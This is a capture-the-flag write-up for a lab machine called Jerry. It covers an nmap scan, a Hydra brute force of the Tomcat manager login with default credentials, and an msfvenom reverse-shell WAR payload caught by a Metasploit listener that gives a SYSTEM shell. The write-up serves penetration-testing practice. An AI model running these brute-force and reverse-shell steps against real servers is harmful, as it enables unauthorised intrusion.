# Jerry

This is the write-up for a machine called Jerry.

## Scanning & Enumeration

Let's start with an nmap scan:

```markdown
nmap -T4 -A -p- 10.10.10.95
```

Relevant results of the scan: 

```markdown
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

## HTTP 

The web server is running on port 8080 and it is displaying a default page of a **Tomcat installation**
The administration page of a default Tomcat server can be found in the **/manager** directory or by clicking on the **"Manager App"** button.

## Brute Force password attack

The web page will ask for a username and password. 
We can try to crack it with **Hydra**:

```markdown
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt 10.10.10.95 -s 8080 http-get /manager/html
```

Or, you can grab a list of default passwords from [netbiosX's GitHub](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)
and run a credential stuffing attack using BurpSuite.
The default credentials are **"tomcat:s3cret"** and we can log in to the administration page.

## Exploiting Tomcat Web Application Manager using Metasploit

Tomcat uses Java Servlets (jsp) and we can upload **Web Application Archive (WAR)** files on the server.

We can create a WAR file that starts a reverse shell with **msfvenom**:

```markdown
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= <your ip> LPORT=5555 -f war -o shell.war
```

Load **Metasploit** and set up your listener:

```markdown
msf5 > use exploit/multi/handler

msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST <your ip>
msf5 exploit(multi/handler) > set LPORT 5555

msf5 exploit(multi/handler) > exploit -j
```

We can upload the **shell.war** file on the server and wee see **"/shell"** in the applications menu. By clicking it, we gain a shell on our listener console tab.
In case this fails and shows you an HTTP error 404, you can try unzipping the WAR file to request the full name of the JSP file:

```markdown
unzip shell.war

(...)
inflating: iklfcfrjeti.jsp
```

After searching for **"http://10.10.10.95:8080/shell/iklfcfrjeti.jsp"** the meterpreter listener starts a session on the machine as **NT Authority/SYSTEM**.
